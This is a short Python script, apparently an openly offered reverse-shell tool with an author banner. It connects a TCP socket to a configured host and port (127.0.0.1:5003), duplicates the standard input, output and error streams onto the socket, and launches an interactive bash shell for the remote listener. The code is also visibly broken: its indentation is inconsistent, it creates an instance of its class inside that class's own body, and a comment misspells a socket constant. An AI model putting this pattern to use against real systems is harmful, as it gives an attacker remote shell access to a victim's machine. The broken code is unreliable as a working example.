#!/usr/bin/env python3

# # # # # # # # # # # # # # # # # # # # # #
#                                         #
#   Author  :   Keyj33k                   #
#   Contact :   nomotikag33n@gmail.com    #
#   Twitter :   @keyjeek                  #
#   Github  :   @keyj33k                  #
#   Insta   :   @keyjeek                  #
#   Version :   1.0.0                     #
#                                         #
# # # # # # # # # # # # # # # # # # # # # # 

from subprocess import run
import os 

class shell:
        
    def __init__(self, TARGET_IPADDRESS, TARGET_PORT):
         self.TARGET_IPADDRESS = TARGET_IPADDRESS
            self.TARGET_PORT = TARGET_PORT
            
    REVERSE_CONNECTION = shell("127.0.0.1", int(5003))
    from os import dup2
    import socket
    
    os.system('clear')
    # Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
    SOCKET_SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    SOCKET_SOCK.connect((REVERSE_CONNECTION.TARGET_IPADDRESS, REVERSE_CONNECTION.TARGET_PORT))

    dup2(SOCKET_SOCK.fileno(),0)
    dup2(SOCKET_SOCK.fileno(),1)
    dup2(SOCKET_SOCK.fileno(),2)
    run(["/bin/bash","-i"])   
    
